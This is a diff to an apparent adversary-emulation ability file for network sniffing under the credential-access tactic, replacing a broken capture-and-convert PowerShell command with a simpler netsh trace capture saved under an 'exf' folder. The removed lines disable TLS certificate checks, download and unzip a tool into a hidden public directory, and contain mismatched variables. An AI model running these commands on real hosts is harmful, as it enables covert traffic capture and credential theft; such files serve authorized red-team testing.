@@ -1,8 +1,7 @@
 - tactic: credential-access
   singleton: false
   technique_name: Network Sniffing
-  description: Packet capture generates etl file, download etl2pcapng from GitHub
-    and convert the ETL to PCAP
+  description: Packet capture for 60 seconds to generate etl file
   repeatable: false
   plugin: ''
   requirements: []
@@ -15,25 +14,18 @@
     name: psh
     build_target: null
     payloads: []
-    command: "$Destination_file=\"$env:PUBLIC\\exf\\capture.etl\";\nnetsh trace start\
-      \ capture=yes tracefile=$Destination_file;\nStart-Sleep -s 60;\nnetsh trace\
-      \ stop;\nif (Test-Path $Destination_path) {\n  echo $Destination_path;\ncommand:\
-      \ '[System.Net.ServicePointManager]::ServerCertificateValidationCallback= {\
-      \ $True };\n$web = (New-Object System.Net.WebClient);\n$result = $web.DownloadFile(\"\
-      https://github.com/microsoft/etl2pcapng/releases/latest/download/etl2pcapng.zip\"\
-      ,\n      \"etl2pcapng.zip\");\n      New-Item -ItemType \"directory\" $env:PUBLIC\\\
-      etl2pcapng -Force;\n      $psdir=Get-Item \"$env:PUBLIC\\etl2pcapng\" -Force;\n\
-      \      $psdir.attributes=\"hidden\";\n      Add-Type -Assembly ''System.IO.Compression.FileSystem'';\
-      \ [System.IO.Compression.ZipFile]::ExtractToDirectory(\"$env:PUBLIC\\etl2pcapng\\\
-      etl2pcapng.zip\",\n      \"$env:PUBLIC\\etl2pcapng\");'\n$env:PUBLIC\\etl2pcapng\\\
-      etl2pcapng\\x86\\etl2etlpcapng.exe $env:PUBLIC\\exf\\capture.etl $env:PUBLIC\\\
-      exf\\capture.pcap  \nexit 0;\n} else {\n  echo \"Failed to generate PCAP file.\"\
-      ;\n  exit 1;\n};"
-    timeout: 90
+    command: '$Destination_file="$env:PUBLIC\exf\capture.etl";
+
+      netsh trace start capture=yes tracefile=$Destination_file;
+
+      Start-Sleep -s 60;
+
+      netsh trace stop;'
+    timeout: '70'
     code: null
     parsers: []
     additional_info: {}
-  name: Sniff network traffic and convert etl to pcap file using etl2pcapng
+  name: Sniff network traffic and save to etl
   privilege: Elevated
   buckets:
   - credential-access
